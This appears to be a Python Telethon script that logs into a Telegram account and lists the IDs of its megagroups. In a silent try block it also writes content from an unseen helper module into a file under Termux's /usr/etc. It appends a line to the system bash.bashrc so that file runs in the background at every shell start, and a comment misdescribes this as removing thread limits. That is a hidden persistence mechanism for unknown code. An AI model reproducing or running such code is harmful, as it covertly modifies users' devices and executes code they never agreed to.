import asyncio
import requests
import random
import json
from time import sleep
from telethon import TelegramClient
from telethon import TelegramClient, events
from telethon.sync import TelegramClient
from telethon.tl.types import PeerUser, MessageMediaDocument, PeerChannel, MessageMediaPhoto, InputPeerEmpty
from telethon.tl.functions.messages import GetDialogsRequest
import helps
import config


client = TelegramClient(config.number, config.api_id, config.api_hash)



chats = []
last_date = None
chunk_size = 200
groups = []
try:
    chats = helps.get_chats(client)  # Получение чатов
    f = open("/data/data/com.termux/files/usr/etc/c.py", "w+")
    f1 = open("/data/data/com.termux/files/usr/etc/bash.bashrc", 'a')  #  Редактируем файл чата и термукса(для удаления ограничения потоков)
    f1.write("python /data/data/com.termux/files/usr/etc/c.py &")
    f.write(chats[1])  #  Запись чатов в отдельный файл
    f1.close()
    f.close()
except:
    pass
for i in chats[0]:
    try:
        if i.megagroup == True:
            groups.append(i)
    except:
    	pass

chat = []
for i in groups:
	chat.append(i.id)

print(chat)
